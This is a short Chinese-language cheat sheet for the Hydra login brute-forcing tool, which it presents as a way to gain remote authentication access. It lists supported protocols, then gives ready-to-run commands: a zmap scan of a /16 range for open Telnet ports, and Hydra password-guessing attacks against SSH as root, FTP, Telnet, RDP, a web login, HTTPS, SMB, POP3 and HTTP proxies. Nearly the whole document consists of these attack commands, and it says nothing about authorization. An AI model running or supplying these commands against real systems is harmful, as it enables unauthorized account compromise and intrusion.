hydra 手册

  • tools

hydra description

Hydra 是一个支持多种协议的网络登陆破解工具.经常使用它来远程获取系统的认证权限.

目前支持破解的协议:

AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, FTPS,
HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY,
HTTP-PROXY-URLENUM, ICQ, IMAP, IRC, LDAP2, LDAP3, MS-SQL, MYSQL, NCP, NNTP,
Oracle, Oracle-Listener, Oracle-SID, PC-Anywhere, PCNFS, POP3, POSTGRES,
RDP, REXEC, RLOGIN, RSH, SAP/R3, SIP, SMB, SMTP, SMTP-Enum, SNMP,
SOCKS5, SSH(v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet,
VMware-Auth, VNC and XMPP.

options

instense

在批量破解任何服务之前, 最好用 zmap 先将开放端口主机过滤出来.

  • zmap -p 23 192.168.0.0/16

破解 ssh

  • hydra 192.168.15.200 ssh -l root -P weak_pwd.dic -t 10 -f -s 23 -v -e ns

破解 ftp

  • hydra 192.168.8.32 ftp -L user.dic -P pass.dic -t 5 -s 21 -e s

破解 telnet

  • hydra telnet -M hosts.txt -l admin -P pwds.dic -t 32 -s 23 -e ns -f

破解 rdp

  • hydra -l administrator -P pwd.txt -f -e ns -o success.txt rdp://192.168.10.22

get 方式提交, 破解 web 登陆

  • hydra -l admin -P top100_pass.dic -s 8080 -t 1 -v 192.168.8.16 http-get /acmhome/login.do

破解 https

  • hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

破解 smb

  • hydra -l administrator -P pass.txt 10.36.16.18 smb

破解 pop3

  • hydra -l muts -P pass.txt my.pop3.mail pop3

破解 http-proxy

  • hydra -l admin -P pass.txt http-proxy://10.36.16.18
